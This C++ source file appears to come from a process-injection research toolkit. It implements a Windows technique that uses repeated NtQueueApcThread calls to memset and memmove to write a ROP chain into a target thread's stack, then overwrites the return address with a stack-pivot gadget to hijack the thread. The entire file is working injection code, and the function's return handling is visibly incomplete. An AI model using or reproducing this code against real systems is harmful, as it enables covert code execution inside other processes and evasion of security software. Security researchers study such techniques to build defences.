// Standard Include's
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <psapi.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <cstdlib>


// Local Include's

#include "Set_Remote_Memory.h"

#ifdef _M_X64

NTSTATUS(NTAPI* NtQueueApcThread)(
	_In_ HANDLE ThreadHandle,
	_In_ PVOID ApcRoutine,
	_In_ PVOID ApcRoutineContext OPTIONAL,
	_In_ PVOID ApcStatusBlock OPTIONAL,
	_In_ __int64 ApcReserved OPTIONAL
	);

int WritePayload(TARGET_PROCESS* target, TStrDWORD64Map* params)
{
	HMODULE ntdll = GetModuleHandleA("ntdll");
	if (!ntdll)
		return 0;
	HANDLE t = target->thread;
	PINJECTRA_PACKET* payload_output;

	// Evaluate Payload
	payload_output = BuildPayload(*params);
	if (payload_output == NULL)
		return NULL;

	TStrDWORD64Map& tMetadata = *payload_output->metadata;

	DWORD64 orig_tos = tMetadata["orig_tos"];
	DWORD64 tos = tMetadata["tos"];
	DWORD64 rop_pos = tMetadata["rop_pos"];
	DWORD64* ROP_chain = (DWORD64*)payload_output->buffer;
	DWORD64 saved_return_address = tMetadata["saved_return_address"];
	DWORD64 GADGET_pivot = tMetadata["GADGET_pivot"];

	NtQueueApcThread = (NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, PVOID, __int64)) GetProcAddress(ntdll, "NtQueueApcThread");

	// Grow the stack to accommodate the new stack
	//for (DWORD64 i = orig_tos - 0x1000; i >= tos; i -= 0x1000)
		//(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(i), (void*)0, 1);
	

	// Write the new stack
	for (int i = 0; i < rop_pos * sizeof(DWORD64); i++)
		(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(tos + i), (void*) * (((BYTE*)ROP_chain) + i), 1);
	
	// Save the original return address into the new stack
	(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memmove"), (void*)(ROP_chain[saved_return_address]), (void*)orig_tos, 8);

	// overwrite the original return address with GADGET_pivot
	for (int i = 0; i < sizeof(tos); i++)
		(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(orig_tos + i), (void*)(((BYTE*)& GADGET_pivot)[i]), 1);
	
	// overwrite the original tos+8 with the new tos address (we don't need to restore this since it's shadow stack!
	for (int i = 0; i < sizeof(tos); i++)
		(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(orig_tos + 8 + i), (void*)(((BYTE*)& tos)[i]), 1);

	//return payload_output;
}

#endif // _M_X64

